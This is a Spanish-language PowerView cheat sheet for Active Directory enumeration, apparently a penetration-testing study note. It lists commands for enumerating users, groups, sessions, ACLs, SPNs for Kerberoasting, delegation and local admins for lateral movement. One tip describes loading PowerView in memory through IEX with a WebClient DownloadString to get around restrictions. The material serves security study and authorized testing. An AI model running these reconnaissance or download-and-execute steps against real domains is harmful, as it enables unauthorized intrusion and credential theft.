## 🧠 Importar PowerView

```powershell
# Importar el módulo
Import-Module .\PowerView.ps1
```

---

## 🏢 Información del Dominio

```powershell
# Información del dominio actual
Get-Domain

# Controladores de dominio
Get-DomainController

# Políticas del dominio
Get-DomainPolicy

# Forest actual
Get-Forest

# Trusts (confianzas entre dominios)
Get-DomainTrust

# Obtener Dominio

Get-NetDomain
```

---

## 👤 Usuarios

```powershell
# Listar todos los usuarios
Get-DomainUser

# Información detallada de un usuario específico
Get-DomainUser -Identity juanperez

# Buscar usuarios con contraseñas no expiran
Get-DomainUser -Properties "PasswordNeverExpires" | Where-Object {$_.PasswordNeverExpires -eq "True"}

# Buscar usuarios con la opción "No puede cambiar contraseña"
Get-DomainUser -Properties "CannotChangePassword" | Where-Object {$_.CannotChangePassword -eq "True"}

# Enumerar Usuarios especificos

Get-NetUser

Get-NetUser | select cn

Get-NetUser | select cn,pwdlastset,lastlogon
```

---

## 👥 Grupos

```powershell
# Listar todos los grupos
Get-DomainGroup

# Miembros de un grupo
Get-DomainGroupMember -Identity "Administradores del dominio"

# Buscar grupos con miembros externos (interdominio)
Get-DomainForeignGroupMember

# Listar grupos especificos:
Get-NetGroup <opciones>

Get-NetGroup | select cn

Get-NetGroup "Sales Department" | select member

```

---

## 🗅️ Máquinas del Dominio

```powershell
# Enumerar todos los equipos unidos al dominio
Get-DomainComputer

Get-NetComputer

# Equipos Windows 10
Get-DomainComputer | Where-Object {$_.OperatingSystem -like "*Windows 10*"}

# Equipos con sesiones activas
Get-NetSession -ComputerName <nombre_equipo>

# Equipos | select filter

Get-NetComputer

Get-NetComputer | select <option1,option2,etc>

```

---

## 🧑‍💼 Administradores de Máquina / Sesiones

```powershell
# Administradores locales de una máquina remota
Get-NetLocalGroup -ComputerName <nombre_equipo>

# Usuarios con sesión activa en un equipo remoto
Get-NetLoggedon -ComputerName <nombre_equipo>

# Ver usuarios que han iniciado sesión remotamente (sesiones SMB)
Get-NetSession -ComputerName <nombre_equipo> 

# Agregar opcionalmente el flag -Verbose para obtener una salida explicita

Get-NetSession -ComputerName <nombre_equipo> -Verbose

```

---

## 🧬 Delegación y SPNs

```powershell
# Cuentas que tienen SPNs (candidatos para Kerberoasting)
Get-DomainUser -SPN

# Delegación sin restricciones
Get-DomainComputer -Unconstrained

# Delegación con restricciones (Resource-Based Constrained Delegation - RBCD)
Get-DomainComputer -TrustedToAuth

Get-NetUser -SPN | select samaccountname,serviceprincipalname

setspn -L iis_service
```

---

## 🧱 ACLs y permisos

```powershell
# Ver los permisos delegados en una OU
Get-DomainObjectAcl -Identity "OU=Marketing,DC=empresa,DC=local" -ResolveGUIDs

# Ver permisos en un usuario/grupo específico
Get-ObjectAcl -SamAccountName juanperez -ResolveGUIDs

Get-ObjectAcl -Identity juandelospalotes

# Filtrar permisos de usuario/grupo

Get-ObjectAcl -Identity "usuario/grupo" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

```
---
## Traducción SID

```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

# se pueden agregar separados por comas ","

"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

```
---

## 📍 Buscar Objetivos Interesantes

```powershell
# Usuarios con posibles contraseñas en descripciones
Get-DomainUser -Properties description | Where-Object { $_.description -like "*pass*" }

# Buscar usuarios con propiedad "adminCount" (indica pertenencia a grupos privilegiados)
Get-DomainUser -Properties adminCount | Where-Object { $_.adminCount -eq 1 }

# Enumerar GPOs del dominio
Get-DomainGPO

# Buscar GPOs linkeadas a OUs específicas
Get-DomainOU -Properties gplink
```

---

## 💡 Tips

- Bajo restricciones, ejecutar PowerView de forma "reflectiva" (sin importar el módulo directamente) usando técnicas como `Invoke-Expression` o `IEX (New-Object Net.WebClient).DownloadString(...)`.
- Uso de `-SearchBase` para limitar el scope de búsqueda a una OU específica.
- Uso de `-LDAPFilter` para búsquedas más precisas.


## 🚪 Enumeración para Movimiento Lateral y Reconocimiento de Sesiones (Post-Explotación)

Estos comandos de PowerView son clave para identificar oportunidades de escalada de privilegios, usuarios conectados, y caminos de pivote dentro de un dominio comprometido.

---

### 🧑‍💼 Enumerar Usuarios con Sesiones Activas Remotas (SMB)

```powershell
# Ver sesiones SMB activas en un equipo remoto
Get-NetSession -ComputerName files04
Get-NetSession -ComputerName web04

# Enumerar en todos los equipos conocidos
Get-DomainComputer | ForEach-Object { Get-NetSession -ComputerName $_.Name }
```

---

### 🔎 Usuarios Logueados en Equipos Remotos

```powershell
# Ver usuarios que han iniciado sesión interactivamente o por servicios
Get-NetLoggedon -ComputerName files04

# Automatizar para varios equipos
Get-DomainComputer | ForEach-Object { Get-NetLoggedon -ComputerName $_.Name }
```

---

### 📂 Enumerar Carpetas Compartidas

```powershell
# Compartidos accesibles en un host remoto
Invoke-ShareFinder -ComputerName files04

# Buscar en todos los equipos
Invoke-ShareFinder
```

---

### 🔑 Enumerar Administradores Locales (Privilegios Elevados)

```powershell
# Administradores locales de un equipo
Get-NetLocalGroup -ComputerName web04

# Buscar en todos los equipos
Get-DomainComputer | ForEach-Object { Get-NetLocalGroup -ComputerName $_.Name }
```

---

### 🔹 Buscar Equipos donde un Usuario Tiene Acceso

```powershell
# Ver en qué equipos un usuario tiene sesión activa (requiere permisos)
Find-DomainUserLocation -UserName juanperez
```

---

### 🎓 Detectar Administradores de Dominio con Sesión Abierta (Target para Token Theft)

```powershell
# Usuarios privilegiados conectados en algún host

Find-LocalAdminAccess

Get-DomainGroupMember -Identity "Administradores del dominio" | ForEach-Object {
    Find-DomainUserLocation -UserName $_.SamAccountName
}
```

---

### 🧬 Enumerar SPNs para Kerberoasting

```powershell
# Buscar cuentas con SPNs (candidatos a Kerberoasting)
Get-DomainUser -SPN
```

---

### 🚨 Detectar Delegación (Escenario de Abuso)

```powershell
# Equipos con delegación sin restricciones
Get-DomainComputer -Unconstrained

# Equipos con delegación basada en recursos
Get-DomainComputer -TrustedToAuth
```

---

### ✨ Tips

- Combinar estos comandos con BloodHound para visualizar paths de ataque.
- Se puede filtrar resultados ruidosos usando `Where-Object` y expresiones condicionales.
- Usar `Out-File` o `Export-Csv` para guardar resultados y analizarlos offline.


